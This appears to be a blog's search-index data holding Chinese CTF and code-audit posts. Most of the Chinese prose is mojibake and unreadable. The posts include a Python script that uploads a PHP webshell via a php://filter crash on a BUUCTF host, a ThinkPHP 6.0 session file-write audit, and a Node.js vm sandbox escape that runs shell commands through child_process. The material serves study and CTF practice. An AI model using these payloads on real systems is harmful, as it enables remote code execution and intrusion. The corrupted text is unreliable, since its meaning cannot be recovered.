fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼Œå†è¿›è¡Œæ–‡ä»¶åçˆ†ç ´å°±å¯ä»¥getshellã€‚è¿™ä¸ªå´©æºƒåŸå› æ˜¯å­˜åœ¨ä¸€å¤„ç©ºæŒ‡é’ˆå¼•ç”¨ã€‚ è¯¥æ–¹æ³•ä»…é€‚ç”¨äºä»¥ä¸‹php7ç‰ˆæœ¬ï¼Œphp5å¹¶ä¸å­˜åœ¨è¯¥å´©æºƒã€‚ â€¢ php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤â€¢ php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤â€¢ php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤ import requests##BytesIOå®ç°äº†åœ¨å†…å­˜ä¸­è¯»å†™bytesfrom io import BytesIOimport repayload = &quot;&lt;?php eval($_POST[a]);?&gt;&quot;#BytesIO(payload.encode()).getvalue()data={ 'file': BytesIO(payload.encode())}url=&quot;http://a06f9704-b58f-4b3a-b85c-5ad42d0b8833.node4.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;try: r=requests.post(url=url,files=data,allow_redirects=False)except: print(&quot;fail!&quot;) pythonè¿è¡Œè„šæœ¬å³å¯ï¼Œç„¶åè¯»dir.phpä¸­çœ‹ä¸€ä¸‹æ–‡ä»¶åï¼Œæ¥ä¸‹æ¥ä½¿ç”¨æ–‡ä»¶åŒ…å«å³å¯","link":"/2021/07/10/buuctf21/"},{"title":"thinkphpv6.0ä»£ç å®¡è®¡","text":"å‰è¨€æ­£å¥½åšåˆ°ä¸€é¢˜thinkphpæ¡†æ¶æ¼æ´ï¼Œäºæ˜¯å†³å®šè‡ªå·±å®¡è®¡ä¸€ç•ª~ï¼Œæ­£å¥½å­¦å­¦å¦‚ä½•å…¥é—¨ ä»£ç å®¡è®¡ä¸¤ç§æ–¹å¼1**.é€šè¯»å…¨æ–‡æºç **2.åŠŸèƒ½ç‚¹å®¡è®¡ï¼šæ ¹æ®æ¼æ´å¯¹åº”å‘ç”Ÿå‡½æ•°è¿›è¡ŒåŠŸèƒ½è¡Œå®¡è®¡ï¼Œå¸¸ä¼šç”¨åˆ°é€†å‘æº¯æºæ•°æ®æµæ–¹æ³•è¿›è¡Œå®¡è®¡3.æ­£å‘è¿½è¸ªæ•°æ®æµï¼šæ ¹æ®ç”¨æˆ·è¾“å…¥å‚æ•°-&gt;æ¥åˆ°ä»£ç é€»è¾‘-&gt;æœ€åå®¡è®¡ä»£ç é€»è¾‘ç¼ºé™·-&gt;å°è¯•æ„é€ payload4.é€†å‘æº¯æºæ•°æ®æµ:å­—ç¬¦ä¸²æœç´¢æŒ‡å®šæ“ä½œå‡½æ•°_è·Ÿè¸ªå‡½æ•°å¯æ§å‚æ•°-&gt;å®¡è®¡ä»£ç é€»è¾‘ç¼ºé™·-&gt;å°è¯•æ„é€ payloadCMSå¯åˆ†ä¸ºä¸¤å¤§ç±»å•å…¥å£cms:ä¸ç®¡è®¿é—®å“ªä¸ªæ¨¡å—éƒ½ä½¿ç”¨åŒä¸€ä¸ªå…¥å£æ–‡ä»¶ï¼Œå¸¸è§çš„MVCæ¡†æ¶é‡‡ç”¨è¿™ç§æ¨¡å¼å¤šå…¥å£cms:æ¯ä¸ªæ¨¡å—éƒ½æœ‰ä¸€ä¸ªå…¥å£æ–‡ä»¶(å¯ä»¥å‰ç«¯è®¾ç½®ä¸€ä¸ªå…¥å£æ–‡ä»¶ index.phpï¼Œåç«¯åˆ›å»ºä¸€ä¸ªå…¥å£æ–‡ä»¶admin.phpï¼Œå‰åç«¯çš„å…¥å£æ–‡ä»¶æ˜¯ç‹¬ç«‹çš„)ã€‚ ä»£ç å®¡è®¡æ€è·¯æ¥ä¸‹æ¥æˆ‘ä»¬ä»ä¸‰ä¸ªå±‚æ¬¡å¼€å§‹æˆ‘ä»¬çš„æºç å®¡è®¡æ€è·¯ 1.ç¡®å®šè¦å®¡è®¡çš„æºç æ˜¯ä»€ä¹ˆè¯­è¨€ 2.ç¡®å®šè¯¥æºç æ˜¯å•å…¥å£è¿˜æ˜¯å¤šå…¥å£ 3.ç¡®å®šè¯¥è¯­è¨€çš„å„ç§æ¼æ´è¯ç”Ÿçš„å‡½æ•° PHPæ ¸å¿ƒé…ç½®ä¸€ä¸ªæ¼æ´åœ¨ä¸åŒç¯å¢ƒé€ æˆçš„ç»“æœä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ã€‚ ç”±äºå…³äºphp.inié…ç½®çš„å†…å®¹è¿‡äºå¤šï¼Œè¿™é‡Œæ¨èæµè§ˆå®˜æ–¹æ–‡æ¡£ https://www.php.net/manual/zh/ini.phpï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä¸»è¦åˆ—ä¸‹php.ini ä¸»è¦ä½¿ç”¨çš„å®‰å…¨é…ç½®ã€‚ safe_mode = off ç”¨æ¥é™åˆ¶æ–‡æ¡£çš„å­˜å–,é™åˆ¶ç¯å¢ƒå˜é‡çš„å­˜å–,æ§åˆ¶å¤–éƒ¨ç¨‹åºçš„æ‰§è¡Œ.PHP5.4.0ç§»é™¤ã€‚ é™åˆ¶ç¯å¢ƒå˜é‡å­˜å–safe_mode_allowed_env_vars = string æŒ‡å®šphpç¨‹åºå¯ä»¥æ”¹å˜çš„ç¯å¢ƒå˜é‡çš„å‰ç¼€,å½“è¿™ä¸ªé€‰é¡¹çš„å€¼ä¸ºç©ºæ—¶,é‚£ä¹ˆphpå¯ä»¥æ”¹å˜ä»»ä½•ç¯å¢ƒå˜é‡,å¦‚æœ å¦‚:safe_mode_allowed_env_vars = PHP_,å½“è¿™ä¸ªé€‰é¡¹çš„å€¼ä¸ºç©ºæ—¶,é‚£ä¹ˆphpå¯ä»¥æ”¹å˜ä»»ä½•ç¯å¢ƒå˜é‡ã€‚ å¤–éƒ¨ç¨‹åºæ‰§è¡Œç›®å½•safe_mode_exec_dir = &quot;/usr/local/bin&quot; å½“å®‰å…¨æ¨¡å¼è¢«æ¿€æ´»ï¼Œsafe_mode_exec_dirå‚æ•°é™åˆ¶é€šè¿‡exec()å‡½æ•°æ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶åˆ°æŒ‡å®šçš„ç›®å½•ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ æƒ³é™åˆ¶åœ¨/usr/local/binç›®å½•æ‰§è¡ŒåŠŸèƒ½ï¼Œä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªæŒ‡ä»¤ï¼š safe_mode_exec_dir = â€œ/usr/local/binâ€ ç¦ç”¨å‡½æ•° disable_functions ä¸ºäº†æ›´å®‰å…¨çš„è¿è¡ŒPHP,å¯ä»¥ç”¨æ­¤æŒ‡ä»¤æ¥ç¦æ­¢ä¸€äº›æ•æ„Ÿå‡½æ•°çš„ä½¿ç”¨,å½“ä½ æƒ³ç”¨æœ¬æŒ‡ä»¤ç¦æ­¢ä¸€äº›å±é™©å‡½æ•°æ—¶,åˆ‡è®°æŠŠdl()å‡½æ•°ä¹ŸåŠ åˆ°ç¦æ­¢åˆ—è¡¨,æ”»å‡»è€…å¯ä»¥åˆ©ç”¨dl()å‡½æ•°åŠ è½½è‡ªå®šä¹‰çš„phpæ‰©å±•çªç ´disable_functions.é…ç½®ç¦æ­¢å‡½æ•°æ—¶å¯ä»¥ä½¿ç”¨é€—å·åˆ†éš”å‡½æ•°åã€‚ COMç»„ä»¶com.allow_dcom = false PHPè®¾ç½®åœ¨å®‰å…¨æ¨¡å¼ä¸‹(safe_mode),ä»å…è®¸æ”»å‡»è€…ä½¿ç”¨COM()å‡½æ•°æ¥åˆ›å»ºç³»ç»Ÿç»„ä»¶æ¥è¿˜è¡Œä»»æ„å‘½ä»¤,æ¨èå…³é—­è¿™ä¸ªå‡½æ•°ã€‚ ä½¿ç”¨COM()å‡½æ•°éœ€è¦åœ¨PHP.iniä¸­é…ç½®extension=php_com_dotnet.dll,å¦‚æœPHPversion&lt;5.4.5åˆ™ä¸éœ€è¦ã€‚ å…¨å±€å˜é‡æ³¨å†Œå¼€å…³register_globals = off php.iniçš„register_globalsé€‰é¡¹çš„é»˜è®¤å€¼ä¸ºOFF,åœ¨4.2ç‰ˆæœ¬ä¹‹å‰æ˜¯é»˜è®¤å¼€å¯çš„,å½“è®¾å®šä¸ºOnæ—¶,ç¨‹åºå¯ä»¥æ¥æ”¶æ¥è‡ªæœåŠ¡å™¨çš„å„ç§ç¯å¢ƒå˜é‡,åŒ…æ‹¬è¡¨å•æäº¤çš„å˜é‡,è¿™æ˜¯å¯¹æœåŠ¡å™¨åˆ†å‚ä¸å®‰å…¨çš„, register_globals = offæ—¶,æœåŠ¡å™¨ç«¯è·å–æ•°æ®çš„æ—¶å€™ç”¨$_GET[â€˜nameâ€™]æ¥è·å–æ•°æ®ã€‚ register_globals = onæ—¶,æœåŠ¡ç«¯ä½¿ç”¨POSTæˆ–GETæäº¤çš„å˜é‡,è±†æµ†è‡ªåŠ¨ä½¿ç”¨å…¨å±€å˜é‡çš„å€¼æ¥æ¥å—ã€‚ é­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤magic_quotes_gpc = on PHP5.4.0è¢«ç§»é™¤ magic_quotes_gpc = off åœ¨php.iniä¸­é»˜è®¤æ˜¯å…³é—­çš„,å¦‚æœæ‰“å¼€å®ƒ,å°†è‡ªåŠ¨æŠŠç”¨æˆ·æäº¤å¯¹sqlçš„æŸ¥è¯¢çš„è¯­å¥è¿›è¡Œè½¬æ¢,å¦‚æœè®¾ç½®æˆON,phpä¼šæŠŠæ‰€æœ‰çš„å•å¼•å·,åŒå¼•å·,å’Œåæ–œæ å’Œç©ºå­—ç¬¦(NULL)åŠ ä¸Šåæ–œæ ()è¿›è¡Œè½¬ä¹‰ å®ƒä¼šå½±å“HTTPè¯·æ±‚çš„æ•°æ®(GET,POST.COOKIE),å¼€å¯å®ƒä¼šæé«˜ç½‘ç«™çš„å®‰å…¨æ€§ã€‚ æ˜¯å¦å…è®¸åŒ…å«è¿œç¨‹æ–‡ä»¶allow_url_include = off è¯¥é…ç½®ä¸ºONçš„æƒ…å†µä¸‹,å¯ä»¥ç›´æ¥åŒ…å«è¿œç¨‹æ–‡ä»¶,è‹¥åŒ…å«çš„å˜é‡ä¸ºå¯æ§çš„æƒ…å†µä¸‹,å¯ä»¥ç›´æ¥æ§åˆ¶å˜é‡æ¥æ‰§è¡ŒPHPä»£ç ã€‚ æ˜¯å¦å…è®¸æ‰“å¼€è¿œç¨‹æ–‡ä»¶allow_url_open = on å…è®¸æœ¬åœ°PHPæ–‡ä»¶é€šè¿‡è°ƒç”¨urlé‡å†™æ¥æ‰“å¼€æˆ–è€…å…³é—­å†™æƒé™,é»˜è®¤çš„å°è£…åè®®æä¾›çš„ftpå’Œhttpåè®®æ¥è®¿é—®æ–‡ä»¶ã€‚ HTTPå¤´éƒ¨ç‰ˆæœ¬ä¿¡æ¯expose_php = off é˜²æ­¢é€šè¿‡httpå¤´æ³„æ¼phpç‰ˆæœ¬ä¿¡æ¯ã€‚ æ–‡ä»¶ä¸Šä¼ ä¸´æ—¶ç›®å½•upload_tmp_dir = ä¸Šä¼ æ–‡ä»¶ä¸´æ—¶ä¿å­˜çš„ç›®å½•,å¦‚æœä¸è®¾ç½®çš„è¯,åˆ™é‡‡ç”¨ç³»ç»Ÿçš„ä¸´æ—¶ç›®å½•ã€‚ ç”¨æˆ·å¯è®¿é—®ç›®å½•open_basedir = D:\\WWW èƒ½å¤Ÿæ§åˆ¶PHPè„šæœ¬åªèƒ½è®¿é—®æŒ‡å®šçš„ç›®å½•,è¿™æ ·èƒ½å¤Ÿé¿å…PHPè„šæœ¬è®¿é—®ä¸åº”è¯¥è®¿é—®çš„æ–‡ä»¶,ä¸€å®šç¨‹åº¦ä¸Šé™åˆ¶äº†ã€‚webshellçš„å±å®³ å†…éƒ¨é”™è¯¯é€‰é¡¹display_errors = on è¡¨æ˜å®ç°PHPè„šæœ¬çš„å†…éƒ¨é”™è¯¯,ç½‘ç«™å‘å¸ƒåå»ºè®®å…³ä¸PHPçš„é”™è¯¯å›æ˜¾ã€‚ é”™è¯¯æŠ¥å‘Šçº§åˆ«error_reporting(E_ALL &amp; ~Enotice) å…·ä½“åˆ—è¡¨æ¨èï¼šhttps://www.runoob.com/php/func-error-reporting.html è¿™é‡Œè®¾ç½®çš„ä½œç”¨æ˜¯å°†é”™è¯¯çº§åˆ«è°ƒåˆ°æœ€é«˜,æ˜¾ç¤ºæ‰€æœ‰é—®é¢˜,æ–¹ä¾¿ç¯å¢ƒéƒ¨ç½²æ—¶å€™æ’é”™ã€‚ ç¯å¢ƒé…ç½®äººç”Ÿå»ºè®®ï¼Œä¸€å®šè¦å®‰è£…phpstudyçš„é›†æˆç¯å¢ƒâ€“æ›´æ”¹é…ç½®çš„æ ¹ç›®å½•ä¸ºwww(5)çš„webç›®å½•ä¿®æ”¹ä¸ºwww/web/ç›®å½•æ‰“å¼€å³å¯ï¼Œæ¥ä¸‹æ¥å»é…ç½®ä¸€ä¸‹æ•°æ®åº“ å»configä¸­çš„database.phpä¿®æ”¹ä¸€ä¸‹é…ç½®ä¿¡æ¯ï¼Œç„¶åå»mysqlä¸­åˆ›å»ºä¸€ä¸‹è¡¨ create database ctf; ä½†æ˜¯ä»–çš„å¾ˆå¤šè¡¨å’Œåº“çš„ä¿¡æ¯æˆ‘ä»¬éƒ½ä¸æ¸…æ¥šâ€“ã€‚ã€‚ã€‚ã€‚æ‰€ä»¥è¿˜æ˜¯è€è€å®å®é‡æ–°å®‰è£…æ•´ä¸ªæ¡†æ¶äº†ã€‚ã€‚https://www.kancloud.cn/manual/thinkphp6_0/1037481è¿™é‡Œé™çº§çš„æ—¶å€™ä¸€ç›´æ²¡å¼„å¥½ï¼Œä¸æ‡‚æ˜¯ä¸ºå•¥ï¼Œç”¨äº†å…¶ä»–çš„å®‰è£…å’Œé™çº§æŒ‡ä»¤æ‰è¡Œ composer create-project topthink/think tp60 ä¿®æ”¹composer.jsoné‡Œé¢çš„â€topthink/framewordâ€ä¸º6.0.0 å»æ‰å‰é¢ä½ çš„æ³¨é‡Šç¬¦ï¼Œå¼€å¯session ç„¶åæ›´æ”¹apacheçš„æ ¹ç›®å½•ä¸ºæ¡†æ¶é‡Œé¢çš„publicç›®å½• åˆ›å»ºæˆåŠŸï¼š æœç„¶æœ€éš¾çš„å°±æ˜¯ç¯å¢ƒçš„é…ç½®-- æ¥ä¸‹æ¥ä¿®æ”¹ä¸€ä¸‹:tp60\\app\\controller\\çš„index.phpæ–‡ä»¶ä½¿ä»–å¯ä»¥åˆ›å»ºsession æ¼æ´åŸç†æ ¹æ®æ¼æ´æè¿°ï¼Œæ˜¯å› ä¸ºsessionå¯æ§ï¼Œä¼ å…¥çš„sessionå€¼æœ€åä¼šæ‹¼æ¥åœ¨sess_åå½¢æˆä»»æ„æ–‡ä»¶è¯»å–è¦†ç›–ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±ç›´æ¥è·Ÿè¿›sessionå€¼çš„ä¼ å…¥ã€‚è¿›å…¥session.phpè§‚å¯Ÿå¦‚ä½•è¿›è¡Œæ–‡ä»¶å†™å…¥ è·Ÿè¿›ä»¥åå‘ç°æ— è¿‡æ»¤ï¼Œåªè¦é•¿åº¦ç¬¦åˆ32ä½å°±å¯¹sessionIDè¿›è¡Œèµ‹å€¼ æ¥ä¸‹æ¥è¿›è¡Œsave()å‡½æ•°è¿›è¡Œsessionçš„ä¿å­˜ï¼Œå¯ä»¥çœ‹åˆ°writeå‡½æ•°ï¼Œå°†dataå†™å…¥sessionIDä¸­ å°†sessionidå’Œsess_è¿›è¡Œæ‹¼æ¥å½¢æˆæ–°çš„æ–‡ä»¶åå­˜æ”¾åœ¨/runtime/session/è·¯å¾„ä¸­ å°†ä¼ å…¥çš„dataå€¼ï¼Œå†™å…¥æ”¹sessionæ–‡ä»¶ä¸­ ä½†æ˜¯ç”±äºæˆ‘ç½‘ç«™æ ¹ç›®å½•è®¾ç½®çš„æ˜¯publicï¼Œæ‡’å¾—å†å¼„äº†ï¼Œè¢«é…ç½®ç¯å¢ƒå¼„æ€•äº†â€“ å°ç»“å•Š æ— è¯­äº†ï¼Œæƒ³è¯´æ¢æˆphpstudyç»§æ‰¿çš„ï¼Œä½†æ˜¯å‘ç°æ²¡æœ‰é€‚åˆçš„phpç‰ˆæœ¬äºæ˜¯å°±åˆæ¢äº†å›å»ï¼ŒæœŸé—´debugçš„æ›´æ¢é…ç½®ä¹Ÿæ˜¯è®©äººå¾ˆå¤´ç–¼ï¼Œæœ€åçé…ç½® ä¹Ÿæ€»ç®—æ˜¯é…ç½®å¥½äº†â€“ï¼ŒçœŸçš„æ˜¯æœ‰ç‚¹å‚»äº†è¯´ä¸€ä¸‹ç¬¬ä¸€æ¬¡å®¡è®¡çš„æ”¶è·1.ä½¿ç”¨ctrlåŠ é¼ æ ‡å·¦é”®å¯ä»¥ç›´æ¥çœ‹è¯¥å‡½æ•°çš„å‡ºç°çš„ä½ç½®2.å¯ä»¥å³é”®å•å‡»æŸä¸ªå€¼æ·»åŠ è§‚å¯Ÿè¿½è¸ªå…¶æ”¹å˜ä½ç½®3.æ ¹æ®å‡ºé—®é¢˜çš„åŠŸèƒ½è¿½è¸ªå…¶åŠŸèƒ½","link":"/2021/07/15/thinkphpv6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"title":"node.jsæ²™ç›’é€ƒé€¸åˆ†æ","text":"èƒŒæ™¯åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œä¼šåœ¨ä¸šåŠ¡ä»£ç ä¸­ç›´æ¥ä½¿ç”¨eval/function/vmç­‰åŠŸèƒ½ï¼Œå…¶ä¸­ eval/Function ç®—æ˜¯åŠ¨æ€æ‰§è¡Œ JSï¼Œä½†æ— æ³•å±è”½å½“å‰æ‰§è¡Œç¯å¢ƒçš„ä¸Šä¸‹æ–‡ï¼Œä½†node.js é‡Œæä¾›äº† vm æ¨¡å—ï¼Œç›¸å½“äºä¸€ä¸ªè™šæ‹Ÿæœºï¼Œå¯ä»¥è®©ä½ åœ¨æ‰§è¡Œä»£ç æ—¶å€™éš”ç¦»å½“å‰çš„æ‰§è¡Œç¯å¢ƒï¼Œé¿å…è¢«æ¶æ„ä»£ç æ”»å‡»ã€‚ æ²™ç›’ç®€ä»‹æ²™ç›’çš„ç‰¹ç‚¹åœ¨äºå¾ˆå¥½çš„ç³»ç»Ÿéš”ç¦»æ€§ï¼Œåœ¨æŸç§ç¨‹åº¦ä¸Šï¼Œæ²™ç›’sandboxå¯ä»¥è§†ä¸ºä¸€ä¸ªå®¹å™¨containerï¼Œapplicationè¿è¡Œåœ¨æ²™ç›’ä¸­ï¼Œæ²™ç›’è¿è¡Œåœ¨windowsæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œåœ¨æ²™ç›’ä¸­çš„applicationå’Œæ²™ç›’å¤–çš„applicationä¸€æ ·å¯ä»¥è®¿é—®ç¡¬ç›˜ä¸­çš„æ–‡ä»¶ç­‰èµ„æºã€‚è¿è¡Œåœ¨æ²™ç›’ä¸­çš„applicationå’Œæ²™ç›’å¤–çš„applicationçš„ä¸»è¦åŒºåˆ«åœ¨äºï¼š å¯¹äºæ²™ç›’å¤–çš„applicationè€Œè¨€ï¼Œæ²™ç›’å†…çš„applicationæ˜¯é€æ˜çš„ï¼ˆå³ä¸å¯è§çš„ï¼‰ï¼› å½“æ²™ç›’å†…çš„applicationé€€å‡ºåï¼Œæ‰€åšçš„æ›´æ”¹å°†ä¸ä¼šè¢«ä¿å­˜ã€‚ ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯ï¼šå½“æ²™ç›’å†…çš„applicationé€€å‡ºåï¼Œæ²™ç›’å†…çš„applicationå·²ä¸‹è½½æˆ–â€œå®‰è£…â€çš„æ¶æ„è½¯ä»¶éƒ½å°†è¢«ä¸¢å¼ƒã€‚ æ€»è€Œè¨€ä¹‹ï¼Œæ²™ç›’å°±æ˜¯ä¸€ä¸ªå¯ä»¥è®©ä½ ç›¸å¯¹å®‰å…¨æ‰§è¡Œä»£ç çš„ç¯å¢ƒ æ²™ç›’é€ƒé€¸é¦–å…ˆæ¥ä¸€æ®µæ²™ç›’é€ƒé€¸çš„å®ä¾‹ï¼Œç›´æ¥è¿›è¡Œåˆ†æï¼š const vm = require('vm');const ctx = {};vm.runInNewContext('this.constructor.constructor(&quot;return process&quot;)().exit()', ctx);//vm.runInNewContextæ˜¯ç¼–è¯‘å’Œè¿è¡Œé‡Œé¢çš„javascriptä»£ç ï¼Œå…¶ä¸­çš„ctxä¼¼ä¹æ˜¯å¯æ§çš„ï¼Œè€ŒthisæŒ‡å‘äº†ctxconsole.log('Never gets executed.'); ä»¥ä¸Šäº‹ä¾‹å¤§è‡´å¯ä»¥æ‹†åˆ†å‡º: tmp=ctx.constructor//objectexec=tmp.constructor//Functionexec('return Process') ä»¥ä¸Šè¢«ç§°ä¸ºåŸå‹é“¾çš„æ–¹å¼å®Œæˆé€ƒé€¸ï¼Œä¸ªäººæ„Ÿè§‰å¯ä»¥å’Œç»§æ‰¿çš„æ€æƒ³è”ç³»åœ¨ä¸€èµ·ï¼Œæœ‰ç‚¹ç±»ä¼¼ä½†æ˜¯åˆä¸åŒï¼Œå¤§æ¦‚æ˜¯é€šè¿‡å¾€å‰å¼•ç”¨åŸå‹é“¾ï¼Œå¼•ç”¨åˆ°æ²™ç®±å¤–çš„å‡½æ•°ï¼Œä»è€Œå®ç°é€ƒé€¸ã€‚ åŸç† æ ¹æ®è¿™ä¸ªå›¾ç‰‡è¿›è¡Œè®²è§£ï¼Œå°±æ˜¯åœ¨vmä¸Šä¸‹æ–‡é€šè¿‡åŸå‹é“¾çš„prototypeå±æ€§å‘ä¸Šé“¾æ¥å¼•ç”¨functionï¼Œå¼•ç”¨åˆ°å…¨å±€æ•°æ®å®ç°åœ¨æ²™ç›’å†…è¿›è¡Œæ²™ç›’å¤–çš„functionçš„è°ƒç”¨ã€‚ å®ä¾‹åˆ†æconst vm = require('vm');const context = { animal: 'cat', count: 2};const script = new vm.Script(`this`);vm.createContext(context);var result = script.runInContext(context);console.log(result.Function == Function); //false å…¶ä¸­thisé€šè¿‡å…¶__proto__å±æ€§æŒ‡å‘çš„æ˜¯ä¸»ç¯å¢ƒçš„Object.prototypeï¼Œæ‰€ä»¥: this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString() 1.é€šè¿‡thisçš„åŸå‹é“¾å‘ä¸Šè·å¾—ä¸»ç¯å¢ƒçš„function2.ç„¶åé€šè¿‡(â€˜return processâ€™)()è·å¾—ä¸»ç¯å¢ƒprocesså˜é‡3é€šè¿‡process.mainModule.requireå¯¼å…¥child_processæ¨¡å—ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ çŸ¥è¯†è¡¥å……processå˜é‡ï¼šæ˜¯nodejsä¸­çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ‹¿åˆ°è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œç›¸å½“äºæ­¤æ—¶æ˜¯åœ¨ä¸»ç¯å¢ƒä¸‹è¿›è¡Œå‡½æ•°çš„æ‰§è¡Œï¼Œç±»ä¼¼å·æ¢æ¢æŸ±ï¼Ÿ child_processæ¨¡å—ï¼šæä¾›äº†å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³• http://nodejs.cn/api/child_process.html#child_process_child_processhttps://chinese.freecodecamp.org/forum/t/topic/587https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/","link":"/2021/07/13/node-js%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/"},{"title":"è®ºjsçš„å¯¹è±¡","text":"å‰è¨€å‘ç°å­¦ä¹ node.jsçš„æ²™ç›’é€ƒé€¸æ—¶ï¼Œå¯¹è±¡çš„æ¦‚å¿µä¹Ÿéœ€è¦ç†è§£ä¸€ä¸‹ã€‚ ä»€ä¹ˆæ˜¯jsjså°±æ˜¯javascriptï¼Œjsé‡Œé¢ä¸€åˆ‡çš†å¯¹è±¡ï¼Œç†è§£å¯¹è±¡æ˜¯ç†è§£jsè¯­è¨€çš„å…³é”® å°è£…ã€ç»§æ‰¿ã€å¤šæ€åœ¨C++/Javaç­‰ä¼ ç»Ÿé¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œç±»ï¼ˆclassï¼‰æ˜¯å¯¹è±¡ï¼ˆobjectï¼‰çš„æ¨¡æ¿ï¼Œclassä¸å ç”¨å†…å­˜ç©ºé—´ï¼Œobjectå ç”¨å†…å­˜ï¼Œobjectä¹Ÿç§°ä¸ºclass instanceï¼ŒåŒä¸€ä¸ªclasså¯ä»¥è¢«newå‡ºå¾ˆå¤šä¸ªobjectã€‚ Javascriptè¯­è¨€ä¸æ”¯æŒâ€ç±»â€ï¼Œä½†Javascriptä»ç„¶æ˜¯é¢å‘å¯¹è±¡è¯­è¨€ï¼Œé¢å‘å¯¹è±¡çš„3è¦ç´ åœ¨JavaScripté‡Œéƒ½æ”¯æŒ: å°è£… - æ•°æ®ä¸æ–¹æ³•å°è£…åœ¨ä¸€èµ·ï¼Œæ–¹æ³•å¯ä»¥æ“ä½œæ•°æ®ï¼Œè¿™å°±æ˜¯JSé‡Œçš„object ç»§æ‰¿ - æ–°åˆ›å»ºçš„å¯¹è±¡å¯ä»¥ç»§æ‰¿çˆ¶å¯¹è±¡çš„æ•°æ®å’Œæ–¹æ³•ï¼Œjsé‡Œæœ‰å¤šç§æ–¹æ³•å®ç°ç»§æ‰¿ï¼Œè­¬å¦‚åŸå‹æ–¹å¼ç»§æ‰¿ï¼Œæ‹·è´ç»§æ‰¿ç­‰ å¤šæ€ - ä¸€ä¸ªæ¥å£æœ‰å¤šç§å®ç° å®é™…ä¸Šï¼Œjsé‡Œä¸€åˆ‡çš†å¯¹è±¡ã€‚ ä»€ä¹ˆæ˜¯å¯¹è±¡jsé‡Œçš„å¯¹è±¡ï¼ˆobjectï¼‰å°±æ˜¯ä¸€ç»„é”®å€¼(name-value)çš„é›†åˆ, nameæ€»æ˜¯stringç±»å‹, valueå¯ä»¥æ˜¯å„ç§ç±»å‹, å¯ä»¥æ˜¯åŸºæœ¬æ•°æ®ç±»å‹, å¯ä»¥æ˜¯æ•°ç»„æˆ–å…¶ä»–å¯¹è±¡, ä¹Ÿå¯ä»¥æ˜¯å‡½æ•°, objectå¾ˆåƒæ˜¯ä¸€ä¸ªhash map. objecté‡Œçš„name-valueæ˜¯æ— åºçš„ã€‚ å¯¹è±¡æ˜¯åŠ¨æ€çš„ï¼Œå¯ä»¥åŠ¨æ€åœ°å¢åŠ å±æ€§å’Œæ–¹æ³•ã€‚ å¯¹è±¡å±æ€§å±æ€§ç‰¹æ€§æ¯ä¸ªå±æ€§éƒ½æ‹¥æœ‰4ä¸ªç‰¹æ€§ï¼Œæ•°æ®å±æ€§å’Œè®¿é—®å™¨å±æ€§ä¸€å…±æœ‰6ç§å±æ€§ç‰¹æ€§: æ•°æ®å±æ€§ç‰¹æœ‰çš„ç‰¹æ€§: [[Value]]: å±æ€§çš„å€¼. [[Writable]]: æ§åˆ¶å±æ€§çš„å€¼æ˜¯å¦å¯ä»¥æ”¹å˜. è®¿é—®å™¨å±æ€§ç‰¹æœ‰çš„ç‰¹æ€§: [[Get]]: å­˜å‚¨ç€getteræ–¹æ³•. [[Set]]: å­˜å‚¨ç€setteræ–¹æ³•. ä¸¤ç§å±æ€§éƒ½æœ‰çš„ç‰¹æ€§: [[Enumerable]]: å¦‚æœä¸€ä¸ªå±æ€§æ˜¯ä¸å¯æšä¸¾çš„,åˆ™åœ¨ä¸€äº›æ“ä½œä¸‹,è¿™ä¸ªå±æ€§æ˜¯ä¸å¯è§çš„,æ¯”å¦‚forâ€¦inå’ŒObject.keys() [[Configurable]]: å¦‚æœä¸€ä¸ªå±æ€§æ˜¯ä¸å¯é…ç½®çš„,åˆ™è¯¥å±æ€§çš„æ‰€æœ‰ç‰¹æ€§(é™¤äº†%%[[Value]]%%)éƒ½ä¸å¯æ”¹å˜ å¯¹è±¡çš„åŸå‹[[prototype]]åœ¨jsä¸­æ‰€æœ‰å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªéšå«çš„å±æ€§[[prototype]]æŒ‡å‘å…¶åŸå‹å¯¹è±¡ï¼ŒåŸå‹å¯¹è±¡ä¹Ÿæœ‰è‡ªå·±çš„åŸå‹ï¼Œå¦‚æ­¤ä¸‹å»ä¾¿å½¢æˆä¸€ä¸ªåŸå‹é“¾ï¼Œæ‰€æœ‰å¯¹è±¡çš„åŸå‹é“¾çš„é¡¶å±‚éƒ½æ˜¯Object.prototype. è¯·æ³¨æ„ï¼Œ[[prototype]]å¹¶ä¸æ˜¯ä¸€ä¸ªçœŸå®çš„å±æ€§åï¼Œå› æ­¤æ— æ³•é€šè¿‡è¿™ä¸ªå±æ€§åè·å¾—åŸå‹å¯¹è±¡ï¼Œä½†jsæä¾›äº†æ–¹æ³•æ¥è¯»å–å’Œåˆ¤æ–­å¯¹è±¡çš„åŸå‹: // 